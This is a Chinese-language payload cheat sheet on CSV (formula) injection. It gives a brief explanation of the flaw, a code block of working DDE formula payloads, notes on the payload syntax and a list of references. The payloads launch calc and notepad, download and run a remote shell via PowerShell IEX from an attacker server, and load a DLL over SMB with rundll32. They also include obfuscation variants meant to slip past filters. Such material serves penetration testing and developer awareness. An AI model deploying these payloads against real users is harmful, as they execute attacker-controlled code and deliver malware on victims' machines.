# CSV注入

许多Web应用程序允许用户将内容（如发票模板或用户设置）下载到CSV文件中。许多用户选择在Excel、Libre Office或Open Office中打开CSV文件。当Web应用程序未正确验证CSV文件的内容时，可能导致一个或多个单元格的内容被执行。

## 利用方法

使用动态数据交换的基本利用方法

```powershell
# pop a calc
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0

# pop a notepad
=cmd|' /C notepad'!'A1'

# powershell download and execute
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0

# msf smb delivery with rundll32
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1

# Prefix obfuscation and command chaining
=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
+thespanishinquisition(cmd|'/c calc.exe'!A
=         cmd|'/c calc.exe'!A

# Using rundll32 instead of cmd
=rundll32|'URL.dll,OpenURL calc.exe'!A
=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A

# Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.
=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A

```



上述有效负载的技术细节：

- `cmd` 是服务器可以在客户端尝试访问服务器时响应的名称
- `/C` calc 是文件名，在我们的案例中是calc（即calc.exe）
- `!A0` 是项名称，指定服务器在客户端请求数据时可以响应的数据单位

任何公式都可以以以下符号开头

```powershell
=
+
–
@
```

## 参考资料

- [OWASP - CSV Excel宏注入](https://owasp.org/www-community/attacks/CSV_Injection)
- [Google Bug Hunter University - CSV Excel公式注入](https://bughunters.google.com/learn/invalid-reports/google-products/4965108570390528/csv-formula-injection)
- [CSV注入：基础到利用!!!! - 2017年11月30日 - Akansha Kesharwani](https://payatu.com/blog/csv-injection-basic-to-exploit/)
- [从CSV到Meterpreter - 2015年11月5日 - Adam Chester](https://blog.xpnsec.com/from-csv-to-meterpreter/)
- [被严重低估的CSV注入危险 - 2017年10月7日 - George Mauer](https://georgemauer.net/2017/10/07/csv-injection.html)
- [三种新的DDE混淆方法](https://www.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation)
- [你的Excel表格不安全！如何击败CSV注入](https://www.we45.com/post/your-excel-sheets-are-not-safe-heres-how-to-beat-csv-injection)
